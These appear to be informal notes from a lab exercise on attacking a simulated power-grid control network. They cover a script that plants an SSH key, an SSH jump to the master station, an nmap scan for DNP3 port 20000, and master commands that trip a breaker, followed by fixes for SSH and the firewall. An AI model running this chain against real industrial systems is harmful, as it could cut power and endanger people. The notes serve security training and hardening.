# 1. The Core network must be accessible from laptop : 
This simulates the fact that our laptop has access to the machine that is connected to the internet
We create an interface and connect one end to switch from core and other to "ethernet" inteface (unused) from laptop

Result : 
- We can ping internet node from laptop
- We cannot ping any other node (default firewall on central node not allowing any forward besides the "internet" ip)

This is even with adding a default route to router `sudo ip route add default via 10.0.14.1` (but this makes internet from laptop dissapear lol)


# 2. Payload execution on "Internet" node : 
Executes the install_ssh.sh (we can invent cute name) that will install laptop public key into ssh authorized key files
Included by default in image /worksapce !
# 3. Connect to master from laptop : 
Ip of internet :  10.0.14.20
Ip of master : 10.0.28.2

`ssh -J root@10.0.14.20 root@10.0.28.2`

# Find the outstation :
first need to make it run (python3 ... on outstation)

Then scan the whole subnet cuz central R has OSPF running and master just has default route to that one :
`nmap -p 20000 --open -T4 -n 10.0.0.0/16`


# Commands at the `master_10>` prompt
```
scan_all                  # read everything (breakers + voltages + line loading)
o0 5 TRIP_PULSE_ON #attack = open breaker
o0 5 LATCH_ON # 
quit                       # NOT ctrl-c, that crashes it
```


# The fix
## Disable password login on all machines :
IN : /etc/ssh/sshd_config

Replace : #PasswordAuthentication yes
By : PasswordAuthentication no 

Restart : 
`ps aux | grep "sshd"`
```
/usr/sbin/sshd -f /etc/ssh/sshd_config
```


## Firewall on central router accepting no forward from internet (even it cannot connect to OT network)